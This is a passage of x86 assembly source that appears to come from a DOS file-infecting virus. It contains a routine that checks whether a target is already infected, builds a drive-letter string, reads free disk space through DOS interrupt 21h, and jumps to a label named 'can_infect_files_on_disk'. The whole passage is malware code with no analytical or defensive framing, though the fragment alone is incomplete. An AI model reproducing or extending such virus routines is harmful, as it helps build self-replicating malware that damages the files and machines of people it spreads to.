         call    infection_check
         je      restore_active_dta
         mov     al,jmp1[si]                ; get drive number
         mov     dl,al
         add     al,40h
         mov     ah,':'
         mov     dhlen[si],ax               ; set up asciiz
         mov     ah,36h                     ; get disk's free space
         int     21h
         mul     bx
         mul     cx
         or      dx,dx
         jnz     can_infect_files_on_disk
